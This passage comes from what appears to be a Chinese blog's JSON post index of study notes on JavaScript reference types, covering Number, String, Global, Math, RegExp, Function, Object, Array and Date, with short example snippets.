\"10.01\" 上述代码中给toFixed传入的参数2表示要显示的小数位数，以0填补必要的小数位，若数值本身包含的小数位比指定的多，则会舍入。由于自动舍入，使得toFixed非常是和处理货币，但需注意，不同浏览器的舍入规则有差异。 另外还有一个用于格式化数值的方法toExponential,该方法返回以指数指示发（e表示法）表示的数值的字符串形式，与toFixed一样，toExponential接收一个表示指定输出结果中小数位数的参数：12var num = 10;console.log(num.toExponential(1)); // \"1.0e+1\" 若想要得到表示某个数值的最合适格式，应该使用toPrecision方法，对一个数值来说，toPrecision方法将自动选择返回的格式，有可能是固定大小格式（fixed），也有可能是指数格式（exponential），该方法也接收一个参数，表示数值的所有数字的位数（不包括指数部分）：1234var num = 99;console.log(num.toPrecision(1)); // \"1e+2\"console.log(num.toPrecision(2)); // \"99\"console.log(num.toPrecision(3)); // \"99.0\" 上述代码中的console.log(num.toPrecision(1));之所以输出&quot;1e+2&quot;是因为1位数无法表示99，所以toPrecision自动舍入为100。 与Boolean对象类似，Number对象也以后台方式为数值提供功能，同时也与Boolean对象一样，仍不建议直接实例化Number类型。 String类型String类型是字符串的对象保证类型，String对象的方法也可以在所有基本的字符串值中访问到，其中valueOf、toString、toLocalString都返回对象表示的基本字符串值。 而length属性表示字符串包含字符数量，此处的数量1个也包含双字节字符。 String类型提供了很多方法，用于辅助完成对ES中字符串的解析和操作。 字符方法：charAt、charCodeAt接收一个表示字符索引位置的参数，charAt返回给定位置的字符，charCodeAt返回字符编码。 字符串操作方法：concat用于链接字符串，slice、substr、substring能基于原字符串创建新字符串，都接收1/2个参数，第一个是指定字符串开始的位置，第二个是结束位置。但substr的第二个参数指定的是字符串长度。同时substring会自动将较小的参数作为开始，较大参数作为结束。但若参数为负时，三者的行为就有却别了，slice会将传入的负值与字符串长度加上，substr会将第一个负值参数加上字符串长度，而将第二个负值参数转换为0，而substring将会把所有负值转换为0， 字符串位置方法：indexOf和lastIndexOf方法，从字符串中搜索给定的子字符串，然后返回子字符串的位置，未找到则返回-1. trim方法，H5新添加的方法，创建字符串的一个副本，删除前后所有空格。 字符串大小写转换方法：toLowerCase、toLocalLowerCase、toUpperCase、toLocalUpperCase。 字符串模式匹配方法： match在字符串上调用接收一个正则表达式/RegExp对象作为参数，这个方法本质上与调用RegExp的exec方法相同。 search方法的参数与match相同，返回第一个匹配项的索引，未找到则返回-1. replace方法接收两个参数，第一个为RegExp对象或一个字符串（字符串不会被转为正则表达式），第二个参数表示将要替换的字符串，可以是表达式或函数。同时第二参数中可以使用特殊的字符序列（正则表达式的短名）。4。 split方法，基于指定分割符将字符串分割为多个子串，两个参数，第一个参数是分割符，可以字符串，也可以是RegExp对象，第二个参数用于指定数组的大小，限制返回的数组元素个数。 localCompare方法，比较两个字符串，返回1/0/-1。（需注意的是这个方法跟地区有关） fromCharCode方法，是String构造函数的静态方法，接收一个或多个字符编码将他们转为一个字符串。 HTML方法：一些简化js动态格式化HTML的方法，建议不使用 单体内置对象ECMA-262对内置对象的定义是：由ES实现提供的、不依赖于宿主环境的对象，这些对象在ES程序执行之前就已经存在。即开发者无需显式实例化内置对象，因为他们一开始就实例化了。比如Object、Array、String.还有两个单体内置对象：Global和Math Global对象Global对象（全局对象）是ES中非常特殊的一个对象（指的是ES中定义的全局对象，而不是浏览器中实现的全局对象），因为这个对象存在但却无法访问。即不属于任何其他对象的属性和方法就是Global的属性和方法，其实，没有全局变量或全局函数，所有在全局作用域中定义的属性和函数，都是Global对象的属性。比如isNaN、parseInt等，Global包含的其他常用方法： URI编码方法：encodeURI（用于整个URI，不会对本身属于URI的特殊字符进行编码，如冒号、斜杠、问号、井号等）、encodeURIComponent（用于URI中的某一段，会对它发现的任何非标准字符进行编码），替代ES3废弃的escape和unescape方法。一般是对整个URI使用encodeURI，而对附加在现有URI后面的字符串使用encodeURIComponent，在实践中常对查询字符串参数进行URI编码。这两个对应的解码方法为decodeURI，decodeURIComponent。 123var uri = 'https://www.shanbay.com/bad links.html#start';encodeURI(uri); // \"https://www.shanbay.com/bad%20links.html#start\"encodeURIComponent(uri); // \"https%3A%2F%2Fwww.shanbay.com%2Fbad%20links.html%23start\" eval方法，非常强大，就像一个完整的ES解析器，接受ES字符串，将其解析运行为实际的ES语句。通过eval执行的代码被认为是包含该次调用的执行环境的一部分，因此被执行的代码具有与该执行环境相同的作用域链，所以通过eval执行的代码可以引用在包含环境中定义的遍历。 123456var msg = 'hello world';eval('console.log(msg);'); // 'hello world';// 反过来调用依然成立eval(\"var msg = 'hello world';\" );console.log(msg); // 'hello world'; 上述代码中，msg是在eval调用环境之外定义的，但其仍能访问msg字符串。但需要注意的是eval中创建的任何变量或函数都不会被提升，因为在解析代码时，他们都是被包含在一个字符串中的，还不是可执行代码，直到eval执行时才创建。使用eval需要特别小心，在严格模式，禁止从外部访问eval创建的任何变量或函数，同时不能为eval赋值。尽量不使用eval函数。 Global对象也有属性，大部分都是一些特殊的值：undefined、NaN、Infinity等，同时，所有原生引用类型的构造函数，如Object、Function、String也都是Global的属性。 ES虽然没有指出如何直接访问Global对象，但Web浏览器将这个全局对象作为window对象的一部分实现了，因此浏览器环境下，全局对象的所有变量和函数，都成为了window对象的属性。即，可以通过在全局环境下返回this或直接使用window变量获取全局对象。 Math对象ES提供了一个公用对象，用于保持数学公式或信息。具体有那些方法和属性，请查看JavaScript Math 对象 一些常用方法： min/max方法： 123456// 直接将多个参数传入方法Math.min(4,6,10,1,0,-1); // -1// 用于数组时，将Math当做apply的第一个参数，设置正确的this值var a = [4,6,10,1,0,-1];Math.max.apply(Math, a); // 10 舍入方法 ceil 向上舍入 floor 向下舍入 round 标准舍入（四舍五入） random方法，返回 0 ~ 1 之间的一个随机数12// 值 = Math.floor(Match.random() * 总数 + 最小值);var num = Math.floor(Math.random() * 10 + 1); // 返回1 ~ 10的随机数 小结对象在JS中被称为引用类型的值，而有一些内置的引用类型可用来创建特定的对象，总结如下： 引用类型与传统面向对象程序设计中的类类似，但实现不同 Object是一个基础类型，其他所有类型都从Object继承了基础的行为 Array类型是一组值的有序列表，同时提供了操作和转换这些值的功能 Date类型提供了关于日期和时间的信息，包括当前日期和时间，以及相关的计算功能 RegExp类型是一个ES支持正则表达式的接口，提供了一些正则表达式功能 函数实际上是Function类型的实例，因此函数也是对象，而由于函数是对象，所以函数也拥有方法，可以用来增强其行为。 因为有了基本包装类型，所以JS中的基本类型值可以被当做对象来方法，三种基本包装类型分别是Boolean、Number、String，他们有一些共同点： 每个包装类型都映射同名的基本类型 在读取模式下访问基本类型值时，会创建对应的基本保证类型的一个对象，从而方便了数据的操作 操作基本类型值的语句执行后会立即销毁新创建的包装对象 在所有代码执行之前，作用域就已经存在两个内置对象Global和Math： 在大多数ES实现中都不能直接访问Global对象，但Web浏览器实现了对应为全局对象的window对象，全局变量和函数都是Global对象的属性 Math对象提供了很多属性和方法，用于辅助完成复杂的数学计算任务","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-8-引用类型2-RegExp/Function","slug":"js-pro8","date":"2016-08-08T09:37:19.000Z","updated":"2017-12-06T14:50:09.368Z","comments":true,"path":"2016/08/08/js-pro8/","link":"","permalink":"https://github.com/xmoyKING/2016/08/08/js-pro8/","excerpt":"","text":"接上篇JavaScript高级程序设计-7-引用类型1-Object/Array/Date RegExp类型ES通过RegExp类型支持正则表达式，创建正则表达式语法如下：123var expression = new RegExp(\"pattern\", \"flags\"); // 构造函数方式, 参数的都是字符串var expression = /pattern/flags; // 字面量语法 其中pattern(模式)部分是正则表达式，可以包含字符类、限定符、分组、向前查找、反向引用。每个正则表达式都可以可带一个或多个标志（flags），用以标明正则表达式的行为。正则表达式的匹配模式支持下列3个标志： g 表示全局（global）模式，将应用于所有字符串，而非仅匹配第一项 i 表示不区分大小写（case-insensitive）模式，在确定匹配项时忽略模式与字符串的大小写 m 表示多行（multiline）模式，即在达到一行文本末尾时还会继续查找下一行中是否存在与模式匹配的项标志位可以任意组合。 模式中使用的所有的元字符都必须转义，,这些元字符都至少1种特殊用途，因此需要转义, 正则表达式的元字符包括：( ) [ ] { } \\ ^ $ | * + . 由于构造函数的方式传入参数是字符串模式，所以需要对元字符进行双重转义，例如字符\\在字符串中通常转义为\\\\,而在正则表达式字符串中就会变为\\\\\\\\。 ES5规定，使用正则表达式字面量必须像直接调用RegExp构造函数一样，每次创建新的RegExp实例。 RegExp实例属性RegExp的每个实例都具有如下属性，通过这些属性可以获取到有关模式的各种信息： global 布尔值，表示是否设置了g标志 ignoreCase 布尔值，表示是否设置了i标志 multiline 布尔值，表示是否设置了m标志 lastIndex 整数，表示开始搜索下一个匹配项的字符位置，从0起 source 返回正则表达式的字符串表示（字面量模式形式，而非传入构造函数中的字符串模式） RegExp实例方法RegExp对象的主要方法是exec(), 该方法专门为捕获组而设计的，exec接收一个参数，即模式的字符串形式，然后返回包含第一个匹配项信息的数组，若没有匹配项则返回null，返回的数组是Array的实例，同时包含两个额外的属性，index和input，其中，index表示匹配项在字符串中的位置，而input表示应用正则表达式的字符串。在数组中，第一项是与整个模式匹配的字符串，其他项是与模式中的捕获组匹配的字符串（若模式没有捕获组，则只包含一项）。123456var text = 'mom and dad and baby';var reg = /mom( and dad( and baby)?)?/gi;var matches = reg.exec(text);console.log(matches); // [\"mom and dad and baby\", \" and dad and baby\", \" and baby\", index: 0, input: \"mom and dad and baby\"] 上例中模式包含两个捕获组，最内部的捕获组匹配”and baby”，而包含它的捕获组匹配”and dad”或”and dad and baby”。当字符串传入exec方法中后，发现了一个匹配项。因为整个字符串本身与模式匹配，所以返回的数组matches的index属性为0，数组的第一项是匹配的整个字符串，第二项包含与第一个匹配组匹配的内容，第三项包含与第二个捕获组匹配的内容。 对于exec方法，即使模式中设置了全局标志g，它每次也只会返回一个匹配向，在不设置全局标志的情况下，在同一个字符串多次调用exec将始终返回第一个匹配项的信息，而在设置全局标志位后，每次调用exec将在上次查找的基础上在字符串中继续查找新匹配项。 第二个方法是test(),它接受一个字符串参数，在模式与参数字符串匹配的情况下返回true，否则返回false。在只想知道字符串是否与某个模式匹配，但不需要知道其文本内容的情况下，这个方法非常有用，多用于if语句中。 RegExp构造函数属性RegExp构造函数包含一些属性（这些属性在其他语言中被看作是静态属性），他们适用于所有正则表达式，并且基于所执行的最近一次正则表达式操作而变化。而且他们有短属性名作为长属性名的别名(某些浏览器无短属性名，且需要用[]语法访问)： 长属性名 短属性名 说明 input $_ 最近一次要匹配的字符串 lastMatch $&amp; 最近一次的匹配项 lastParen $+ 最近一次匹配的捕获组 leftContext $` input字符串中lastMatch之前的文本 rightContext $’ input字符串中lastMatch之后的文本 multiline $* 布尔值，表示是否所有表达式都使用多行模式,某些浏览器无此属性 而除了上述的几个属性名之外，还有9个用于存储捕获组的构造函数属性，分别是$1 ~ $9，存储第一，第二… 第九个匹配的捕获组，在调用exec和test时，将自动填充所有的构造函数属性。12345678910111213var text = \"this has been a short summer\";var reg = /(.)hort/g;if(reg.test(text))&#123; console.log( RegExp.input, // this has been a short summer RegExp.leftContext, // this has been a RegExp.rightContext, // summer RegExp.lastMatch, // short RegExp.lastParen, // s RegExp.multiline, // undefined )&#125; 模式的局限性尽管ES中的正则表达式功能不少，但比起某些语言来说（如Perl）还是缺少了一些高级特性，具体有哪些可自习查阅Regular-Expressions Function类型ES中的Function类型实际上对象，每个函数都是Function类型的实例，而且与其他引用类型一样，具有模式的方法和属性，由于函数是对象，所以函数名其实也只是一个指向函数对象的指针而已，不会与某个函数绑定。函数通常是使用函数声明语法定义的。如下三种定义函数的方式，效果基本无差别，函数的使用都一样。12345678910// 普通函数声明方式function sum(n1, n2)&#123; return n1 + n2;&#125;// 函数表达式方式定义函数var sum = function(n1, n2)&#123; return n1 + n2;&#125;;// Function构造函数方式，非常不推荐，非常麻烦var sum = new Function('n1', 'n2', 'return n1 + n2;'); 之所以不推荐构造函数的方式（技术上其实算是一个函数表达式，）是因为这种语法会导致解析两次代码，第一次是解析常规ES代码，第二次是解析传入构造函数中的字符串，从而影响性能。而且非常不利于书写和阅读。但则这种方式对于理解“函数是对象，函数名是指针”的概念却非常直观，方便。 深入理解“没有重载”将函数名想象为指针，对理解为何ES中没有函数重载的概念有帮助,即后创建的同名函数实际上覆盖了引用的哥函数的变量：12345678910111213141516function add(num)&#123; return num + 100;&#125;function add(num)&#123; return num + 200;&#125;var rst = add(100); // 300// 上述代码与下面代码等价 var add = function(num)&#123; return num + 100;&#125;;add = function(num)&#123; return num + 200;&#125;;var rst = add(100); // 300 函数声明和函数表达式实际上，普通函数声明方式和函数表达式方式还是有区别的，解析器在向执行环境中加载数据时，对函数声明和函数表达式并非一视同仁，解析器会先读取函数声明，并使其在执行任何代码之前可用（可访问）。至于函数表达式，则必须等到解析器执行到它所在代码处时，才会真正被解释执行。 解析器通过函数声明提升（Function declaration hoisting）的过程读取并将函数声明添加到执行环境中，对代码求值时，js引擎在第一遍就声明函数并将他们放到源代码树的顶部，所以，即使声明函数的代码在调用它的代码之后，js引擎也能把函数声明提升到顶部。 之所以会报错，是因为函数表达式则不会有函数声明提升的过程，且函数位于一个初始化语句中，在执行到函数所在的语句之前，变量不会保持对函数的引用，而且由于调用在前导致出错，后面代码也无法执行了。 作为值的函数因为ES中的函数名本身就是变量，所以函数也可以当做值来使用。 代码为例，有一个对象数组，根据某个对象属性对数组进行排序，而传递给数组sort方法的比较函数要接收两个参数，即要比较的值，但又需要一种方式来指明按照那个属性来排序，要解决这个问题，可以定义一个函数，它接收一个属性名，然后根据这个属性名来创建一个比较函数：12345678910111213141516171819202122function createComparisonFunction(name)&#123; return function(obj1, obj2)&#123; var v1 = obj1[name]; var v2 = obj2[name]; if(v1 &gt; v2)&#123; return 1; &#125;else if(v1 &lt; v2)&#123; return -1; &#125; return 0; &#125;&#125;// 使用var data = [&#123;name: 'king', age: 25&#125;, &#123;name: 'tom', age: 11&#125;];data.sort(createComparisonFunction(\"name\"));console.log(data[0].name); // kingdata.sort(createComparisonFunction(\"age\"));console.log(data[0].name); // tom 函数内部属性在函数内部，有两个非常特殊的对象，arguments和this，其中arguments是一个类数组对象，包含着传入函数中的所有参数，arguments对象的主要用途是保存函数参数，其上还有一个callee属性，这个callee属性是一个指针，指向拥有这个arguments对象的函数，即函数本身。 另一个特殊对象this，其行为与java和C#中的this大致类似，this引用的是函数当前执行时的环境对象。 同时ES5规范了另一个函数对象的属性，caller，这个属性保存着调用当前函数的函数的引用，若是在全局作用域中调用函数，则它的值为null。1234567891011121314151617181920function outer()&#123; inner();&#125;function inner()&#123; console.log(inner.caller);&#125;outer(); // 返回outer的源码// 上述代码与下面的代码等价，但耦合更小function outer()&#123; inner();&#125;function inner()&#123; console.log(arguments.callee.caller);&#125;outer(); // 返回outer的源码 在严格模式下，访问callee、caller会报错，总而言之，尽量少用这一对函数内部属性。 函数属性和方法ES中每个函数都包含两个属性： length和prototype，length表示函数希望接收的命名参数的个数（形参个数）。 对ES中的引用类型来说，prototype是保持它们所有实例方法的真正所在，即toString和valueOf方法实际上好似保持在prototype上的，只不过通过各自对象的实例访问而已。 在创建自定义引用类型以及实现继承时，prototype非常重要，同时ES5中，prototype属性是不可枚举的，即无法用for-in遍历到。 每个函数还包含两个非继承而来的方法，apply和call，他们的用途是在特定的作用域中调用函数，实际上等于设置函数体内this对象的值，其中apply接收2个参数，第一个参数是表示函数作用域的对象，第二个是参数数组（可以是arguments这样的类数组对象）。 call方法与apply用法类似，第一个都是表示this值的对象，第二个参数却不是参数数组，而是将参数一一列举传入。 事实上，apply和call真正有用的地方是能够扩充函数赖以运行的作用域，这样对象就不需要与方法有任何耦合关系。实例如下：1234567891011window.color = 'red';var o = &#123;color: 'blue'&#125;;function say()&#123; console.log(this.color);&#125;say(); // redsay.call(this); // redsay.call(window); // redsay.call(o); // blue ES5还定义了函数的bind方法，该方法会创建一个函数的实例，其this值会被绑定到传给bind函数的值。123456789window.color = 'red';var o = &#123;color: 'blue'&#125;;function say()&#123; console.log(this.color);&#125;var obj = say.bind(o);obj(); // blue; 最后，函数还继承了toString，toLocalString，valueOf方法，三者都返回函数代码，而且其实现因浏览器而异。","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-7-引用类型1-Object/Array/Date","slug":"js-pro7","date":"2016-08-08T03:00:14.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/08/js-pro7/","link":"","permalink":"https://github.com/xmoyKING/2016/08/08/js-pro7/","excerpt":"","text":"引用类型的值（对象）是引用类型的一个实例，在ES中，引用类型是一种数据结构，用于将数据和功能组织在一起。在其他面向对象语言中，称为类的数据结构也有这种功能，虽然ES从技术上也是一门面向对象的语言，但ES并不具备传统的面向对象语言所支持的类和接口等基本结构，引用类型有时候也被称为对象定义，因为它们描述的是一类对象所具有的属性和方法。 注：虽然引用类型和类看起来相似，但不是一个概念。 对象是某个特定引用类型的实例，新对象是使用new 操作符后跟一个构造函数来创建的，构造函数本身是一个函数，只不过该函数的目的是创建对象。 代码var person = new Object();创建了Object引用类型的一个新实例，然后把该实例保持在变量person中，使用的构造函数是Object，构造函数为新对象定义了默认的属性和方法。ES提供了很多原生引用类型以便开发者使用。 Object类型Object是ES中使用最多的一个类型，大多数引用类型值都是Object类型的实例。Object实例具备的功能不多，但非常利于存储和传输数据。 创建Object实例的方式有两种，第一个是使用new操作符后跟Object构造函数：123var person = new Object();person.name = \"king\";person.age = 26; 另一个方式是使用对象字面量表示法，对象字面量是对象定义的一种简写形式，目的在于简化创建包含大量属性的对象的过程，也是日常中使用最多的一种方式：1234var person = &#123; name: \"king\", age : 26&#125;; 使用对象字面量语法时，属性名可以是数字（会自动转换为字符串），访问时需要用[]语法。同时若留空其花括号，则可以定义只包含默认属性和方法的对象，与使用new Object()相同，但通过对象字面量创建的对象不会调用Object构造函数。 Array类型除了Object之外，Array数组类型算是最常用的类型了，ES的数组可以存放任意类型的数据，同时大小可以动态调整。创建数组也有两种方式：使用Array构造函数方式和数组字面量方式。 当使用构造函数方式时，需要注意，若只传入一个数字时，其实是指定数组的大小。其他情况下则参数自动被初始化为数组的元素。1234567891011121314var a1 = new Array(); // 初始化一个空的数组console.log(a1.length, a1);var a2 = new Array(3); // 初始化一个大小为3的数组，3个元素都被初始化为undefinedconsole.log(a2.length, a2);var a3 = new Array('king'); // 初始化一个有1个元素的数组，该元素是字符串\"king\"console.log(a3.length, a3);var a4 = new Array(1,2,3); // 初始化一个有三个元素的数组，元素分别为1，2，3console.log(a4.length, a4);var a5 = Array(); // 可以省略new操作符console.log(a5.length, a5); 使用数组字面量的方式则简单很多：1234567891011var a1 = []; // 初始化一个空的数组console.log(a1.length, a1);var a2 = [,,,]; // 初始化一个大小为3的数组，3个元素都被初始化为undefinedconsole.log(a2.length, a2);var a3 = ['king']; // 初始化一个有1个元素的数组，该元素是字符串\"king\"console.log(a3.length, a3);var a4 = [1,2,3]; // 初始化一个有三个元素的数组，元素分别为1，2，3console.log(a4.length, a4); 注意：若需要一个确定大小的数组时，不建议使用字面量的方式预设大小，因为不利于阅读，同时浏览器中会有实现差异，有的浏览器会忽略最后一个逗号，有的不会。 数组的length属性是可读写的，通过设置这个属性，可以从末尾移除已有项或详述组中添加新的项，新添加的项用undefined初始化。1234567891011var a1 = [1,2,3]; // 初始化一个有三个元素的数组，元素分别为1，2，3a1.length = 2;console.log(a1.length, a1[2]); // 2, undefinedvar a2 = [1,2,3]; // 初始化一个有三个元素的数组，元素分别为1，2，3a2.length = 4;console.log(a2.length, a2[3]); // 4, undefinedvar a3 = [1,2,3]; // 初始化一个有三个元素的数组，元素分别为1，2，3a3[99] = 99;console.log(a3.length, a1[98]); // 100, 索引3-98 都为undefined 检测数组ES3有一个确定某对象是否是数组的经典问题：对一个页面或全局作用域而言，使用instanceof操作符即可value instanceof Array.但这存在一个问题，即instanceof假定单一的全局执行环境。当页面包含多个iframe时，实际上存在两个以上的不同的全局执行环境，此时就存在了两个以上不同版本的Array构造函数，所以，当从一个框架向另一个传入数组，那么传入的数组与第二个框架中原生创建的数组分别具有不同的构造函数，导致判断错误。 ES5为了解决这个问题，新增了Array.isArray(value)方法，用于检测一个值到底是不是数组，不论在哪个执行环境。 转换方法数组是一个对象，所以也有toString、toLocalString、valueOf等方法，其中，valueOf返回数组本身，toString返回一个字符串，将元素的字符串形式串联起来，用逗号分割。实际上数组的toString方法会调用数组每一项的toString方法。toLocalString与toString类似。 可以用数组的join()方法来达到同样的效果，其中join接收一个参数作为分隔符。join默认逗号作为分割符，即传入undefined与不传的效果一样。12345var a = [1,2,3,4];a.join(':'); // \"1:2:3:4\"a.join(); //\"1,2,3,4\"a.join(undefined); // \"1,2,3,4\"a.join(null); // \"1null2null3null4\" 若数组中的某一项是null或undefined，则在join、toString、toLocalString、valueOf方法的返回结果中以空字符串表示。 栈方法通过push、pop方法，可以将数组当做栈使用，这期间数组的大小是动态改变的。 队列方法通过push、pop、shift、unshift方法，可以将数组当做队列使用，这期间数组的大小是动态改变的。 重排序方法通过reverse、sort方法可以对数组序列重新排列。 其中sort默认是升序排列数组项，sort方法会调用每个数组项的toString方法，然后比较得到的字符串，所以这种策略在对比纯数值、或字符串存在大小写时会出问题。 所以，sort可以接受一个比较函数作为参数，以便指定哪个值放在前面。比较函数接收两个参数，若第一个参数应该放在前面，则返回一个负数，若第一个参数应该放在后面，则返回一个正数，若两者相等，则返回0:1234567891011121314function compare(v1, v2)&#123; if(v1 &lt; v2)&#123; return -1; &#125;else if( v1 &gt; v2)&#123; return 1; &#125;else &#123; return 0; &#125;&#125;var a = [0,1,5,10,3,15];// a.sort(); // [0, 1, 10, 15, 3, 5]a.sort(compare);console.log(a); // [0, 1, 3, 5, 10, 15] reverse和sort的返回值都是进过排序后的数组，若数组元素是数值类型或其valueOf返回的是数值类型的对象类型，则直接返回两数相减即可：123function compare(v1, v2)&#123; return v1 - v2; // 降序&#125; 操作方法concat方法concat方法能连接2个数组，其实是创建一个新数组。具体来说，这个方法会先创建当前数组的一个副本，然后将接收到的参数添加到这个副本的末尾，最后返回新构建的数组。 在没有给concat方法传递参数的情况下，它仅仅复制当前数组并返回副本。若给concat传入一个或多个数组，则将这些数组的每一项都添加到新数组中，而非数组参数也会被添加到新数组中。 slice方法slice方法能基于当前数组的一个或多个项创建新数组，slice方法接受一个或两个参数，分别表示返回项的起始和结束位置。slice方法不会影响到原数组。 在只有一个参数的情况下，slice方法返回从该参数指定位置开始到当前数组末尾的所有项。若有2个参数则返回起始和结束位置之间的项，但不包括结束位置项。 但参数为负数时，则从后算起（用数组长度加上该负数）。若结束位置小于起始位置，则返回空数组。 splice方法splice方法非常强大，有多种用法，主要用途是向数组中插入项，但也能做到其他效果： 删除，可以删除任意数量的项，指定2个参数，要删除的第一项的位置和要删除的数量，如splice(0,2)会删除数组的头两项。 插入，可以向指定位置插入任意数量的项，指定3个参数，起始位置、0（表示不删除）、插入的新项（若有多个则依次排列即可），如splice(2,0,&#39;red&#39;,&#39;green&#39;)会从数组的位置2开始插入字符串red和green 替换，向指定位置插入任意数量的项，且同时删除任意数量的项，如splice(2,1,&#39;red&#39;,&#39;green&#39;)会从数组的位置2开始删除1项，然后再从位置2开始插入字符串red和green splice方法始终返回数组，该数组中宝哈你从元素数组中删除的项（若没有删除则返回一个空数组）。 位置方法ES5中添加了2个数组位置方法，indexOf和lastIndexOf,这两个方法接收两个参数，要查找的项和表示查找起点位置的索引，省略第二个参数时，则indexOf默认从数组开头向后查找，而lastIndexOf反之。 indexOf和lastIndexOf方法使用全等比较，若没有找到则返回-1，否则返回第一个参数所在索引。 迭代方法ES5为数组添加了5个迭代方法，每个方法都接受2个参数，分别是要在每一项运行的函数和运行该函数的作用域对象（影响this的值，默认为当前调用数组为运行环境），而传入的函数会在运行时接收三个参数：当前数组项的值，该项所在位置索引，数组本身。以下分别是5个迭代方法的作用： every方法，对数组中的每一项运行给定函数，若该函数对每一项都返回true，则返回true filter方法，对数组中的每一项运行给定函数，返回新的数组，新数组的项为该函数会返回true的项 forEach方法，对数组中的每一项运行给定函数，无返回值 map方法，对数组中的每一项运行给定函数，返回每次函数调用的结果组成的数组 some方法，对数组中的每一项运行给定函数，若只要对任意一项函数返回true，则返回true 以上方法不会修改原数组。 缩小方法ES5还添加了2个缩小数组的方法：reduce和reduceRight，这两个方法也会迭代数组的所有项，然后构建一个最终返回的值（不是数组，而是一个值）。其中，reduce从数组的第一项开始，逐个遍历到最后。而reduceRight则从后向前遍历。 这两个方法都接收2个参数，一个在每一项上调用的函数和初始值（若不指定初始值则默认为数组的第一/最后项）。第一个函数参数在运行接受四个参数，分别是前一项，当前项，当前项的索引，原数组对象。函数的返回值会作为下一次函数运行的第一参数。 对reduce方法，若不指定初始值则第一次迭代发生在数组的第二项上，因为第一个参数是数组的第一项，第二个参数就是数组的第二项。12345678910111213// 不指定初始值var a = [1,2,3,4,5];var sum = a.reduce(function(prev, crt, idx, array)&#123; return prev + crt;&#125;);console.log(sum); // 15// 指定初始值var a = [1,2,3,4,5];var sum = a.reduce(function(prev, crt, idx, array)&#123; return prev + crt;&#125;, 10);console.log(sum); // 25 Date类型ES中的Date类型是在早期的java.util.Date类基础上构建的，因此，Date类型基于UTC（Coordinated Universal Time 国际协调时间），从1970年1月1日0时开始经过的毫秒数来保存日期。在这种情况下，Date类型保存的日期能够精确到以1970年1月1日0时为中分前后的285616年。 调用Date构造函数在不传入参数的情况下，新对象默认获取当前的时间和日期，若想根据特定的日期和时间创建日期对象，则必须传入该日期的毫秒数（从1970年1月1日0时开始计算），为了简化计算过程，ES提供Date.parse和Date.UTC方法。 Date.parse方法接收一个表示日期的字符串参数，然后尝试根据字符串返回相应日期的毫秒数，ES并没有定义parse应该支持那种日期格式，因此该方法因实现而异，通常接收如下几种日期格式： 月/日/年 英文月名 日,年 年-月-日T时:分:秒 （ISO 8601扩展格式）若传入的字符串不能表示日期，则返回NaN，事实上，若直接将日期字符串传入Date构造函数中后，Date构造函数会在内部调用Date.parse方法。即如下调用方式等价：12var date = new Date(Date.parse(\"May 25, 2014\"));var date = new Date(\"May 25, 2014\"); Date.UTC方法同样返回表示日期的毫秒数，但它与Date.parse方法在构建值时基于不同的信息。Date.UTC的参数分别是年、月（从0开始）、日（从1开始）、时（从0开始）、分、秒、毫秒。这些参数中，年和月参数是必须的，其他默认为最小值。 Date构造函数也可接收Date.UTC的参数，但日期和时间是基于本地时区而非GMT。 ES5添加了Date.now方法，返回表示调用时的时间毫秒数。1234var start = Date.now();// ...var end = Date.now();var during = end - start; 继承的方法Date类型重写了toLocalString、toString、valueOf方法，其中toLocalString和toString的结果因浏览器实现不同而异，但总的来说是返回日期的字符串格式，仅在调试时有用，用于显示还是有差异，慎用。valueOf返回日期的毫秒数。 日期格式化方法Date类型有一些专门将日期格式化为字符串的方法（因浏览器实现不同而异）： toDateString 显示星期、月、日、年 toTimeString 显示时、分、秒、时区 toLocalDateString 显示某地区的星期、月、日、年 toLocalTimeString 显示时、分、秒 toUTCString 显示完整的UTC日期 日期/时间组件方法Date还提供了一些获取/设置日期值中特定部分的方法: 日期/时间组件方法","categories":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/categories/js/"}],"tags":[{"name":"js","slug":"js","permalink":"https://github.com/xmoyKING/tags/js/"},{"name":"js-pro","slug":"js-pro","permalink":"https://github.com/xmoyKING/tags/js-pro/"}]},{"title":"JavaScript高级程序设计-6-变量、作用域和内存问题","slug":"js-pro6","date":"2016-08-06T09:18:11.000Z","updated":"2017-12-06T14:50:09.352Z","comments":true,"path":"2016/08/06/js-pro6/","link":"","permalink":"https://github.com/xmoyKING/2016/08/06/js-pro6/","excerpt":"","text":"按ECMA-262的定义，js的变量与其他语言有很大区别，js变量本质是松散类型，决定了它仅仅只是在特定的时间用于保存特定值的一个名字而已。由于这种灵活性，js变量很容易引发一些问题，同时能变得非常复杂。 基本类型和引用类型的值ES变量可能包含两种不同类型的值：基本类型和引用类型。基本类型值指的是简单的数据段，而引用类型值指的是那些可能由多个值构成的对象。 在将一个值赋给变量时，解析器必须确定这个值是基本类型还是引用类型，5种基本类型是按值访问的，因为可以操作保持在变量中的实际的值。 引用类型的值是保存在内存中的对象，与其他语言不同，js不允许直接访问内存中的位置，也就是说不能直接操作对象的内存空间，在操作对象时，实际上是在操作对象的引用而不是实际的对象，所以，引用类型的值是按引用访问的。 注：其他语言中字符串是以对象的形式访问的，是引用类型的，但ES不是。 动态的属性定义基本类型和引用类型的方法是类似的，创建一个变量并为变量赋值即可。但保存到变量中后，不同类型的值可执行的操作却大不一样。对应引用类型的值，可以为其添加属性和方法，也可以改变和删除其上的属性和方法。 只能给引用类型的值动态添加属性，对基本类型的值添加属性和方法虽然不会报错，但是不会有任何效果。123var name = \"king\";name.age = 25;console.log(name.age); // undefined 复制变量值对于基本类型来说，将一个变量复制给另一个变量其实是在变量对象上创建一个新值，然后将该值复制到为新办理分配的位置上。两个变量都独立。12var num1 = 5;var num2 = num1; // num2也等5，但num1和num2是彼此独立的。 但引用类型的复制则不同，复制操作结束后，两个变量实际上引用同一个对象，因此改变其在一个变量，会影响另一个变量。1234var obj1 = new Object();var obj2 = obj1;obj1.name = 'king';console.log(obj2.name); // king 